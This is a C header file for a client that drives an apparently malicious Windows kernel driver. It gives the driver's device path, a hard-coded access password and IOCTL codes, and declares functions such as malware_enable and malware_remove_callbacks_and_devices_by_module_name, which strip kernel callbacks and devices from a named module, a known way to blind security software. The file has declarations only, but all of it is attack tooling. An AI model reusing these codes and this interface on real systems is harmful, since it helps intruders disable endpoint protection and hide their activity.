#ifndef MAIN_H
#define MAIN_H

#include <Windows.h>

#include <stdint.h>
#include <stdio.h>
#include <stdbool.h>

#define DEVICE_PATH "\\??\\fqg0Et4KlNt4s1JT"
#define PASSWORD L"7N6bCAoECbItsUR5-h4Rp2nkQxybfKb0F-wgbJGHGh20pWUuN1-ZxfXdiOYps6HTp0X"

#define IOCTRL_ENABLE 0x222080
#define IOCTRL_LOAD_API 0x2220c0
#define IOCTRL_REMOVE_CALLBACKS_AND_DEVICES_BY_MODULE_NAME 0x222400

#define AM_NAME_LENGTH 256

#define AM_ARRAY_LENGTH 1024
typedef struct _api_mapping
{
    struct
    {
        uint64_t rva;
        char name[AM_NAME_LENGTH];
    } array[AM_ARRAY_LENGTH];
    uint32_t length;
} api_mapping_t;

typedef struct _ioctrl_0x222400_msg
{
    wchar_t *target_module;
    bool remove_or_patch;
    uint8_t padding_0;
    bool remove_devices;
    uint8_t padding_1[5];
} ioctrl_0x222400_msg_t;

uint32_t open_device(HANDLE *device);
uint32_t malware_enable(HANDLE device);
uint32_t malware_load_api(HANDLE device);
uint32_t malware_remove_callbacks_and_devices_by_module_name(HANDLE device, wchar_t *target_module, bool remove_or_patch, bool remove_devices);
uint32_t send_ioctrl(HANDLE device, uint32_t io_ctrl_code, void *input, uint32_t input_size, void *output, uint32_t output_size);

#endif // MAIN_H